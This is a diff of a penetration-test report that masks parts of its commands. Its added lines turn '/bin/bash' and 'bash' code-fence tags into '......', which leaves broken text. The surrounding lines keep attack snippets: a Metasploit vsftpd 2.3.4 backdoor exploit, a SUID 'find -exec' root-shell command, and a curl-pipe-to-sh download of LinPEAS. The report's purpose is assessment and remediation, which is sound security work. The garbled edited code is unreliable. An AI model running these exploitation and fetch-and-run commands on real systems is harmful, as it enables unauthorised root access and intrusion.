@@ -148,7 +148,7 @@ Status: Success
 Outcome: Root shell obtained
 ```
 
-On the secondary target (192.168.1.150), LinPEAS enumeration script identified misconfigured SUID binaries. The /usr/bin/find binary had SUID permissions, allowing privilege escalation from www-data to root using the command: `find . -exec /bin/bash -p \;`
+On the secondary target (192.168.1.150), LinPEAS enumeration script identified misconfigured SUID binaries. The /usr/bin/find binary had SUID permissions, allowing privilege escalation from www-data to root using the command: `find . -exec /bin/...... -p \;`
 
 ### 2.4 API Security Testing (14:30 - 15:30)
 
@@ -413,7 +413,7 @@ Enable SMB signing, implement network segmentation, disable NTLM authentication 
 
 **Configuration Hardening**
 1. Remove SUID permissions from unnecessary binaries
-   ```bash
+   ```......
    find / -perm -4000 -type f 2>/dev/null | xargs chmod u-s
    ```
 2. Configure proper file permissions (principle of least privilege)
@@ -509,7 +509,7 @@ After implementing remediation measures, conduct verification testing:
 ### 5.1 Exploit Details and Proof of Concepts
 
 **Exploit 1: VSFTPD 2.3.4 Backdoor**
-```bash
+```......
 # Metasploit exploitation
 msfconsole
 use exploit/unix/ftp/vsftpd_234_backdoor
@@ -537,9 +537,9 @@ for user_id in range(1000, 2000):
 ```
 
 **Exploit 3: SUID Privilege Escalation**
-```bash
+```......
 # As www-data user
-find . -exec /bin/bash -p \;
+find . -exec /bin/...... -p \;
 # Result: Root shell (#)
 ```
 
@@ -556,7 +556,7 @@ Internet → Firewall → DMZ (192.168.1.0/24)
 ### 5.3 Tools Configuration
 
 **LinPEAS Enumeration:**
-```bash
+```......
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
 # Identified SUID vulnerabilities, writable cron directories
 ```
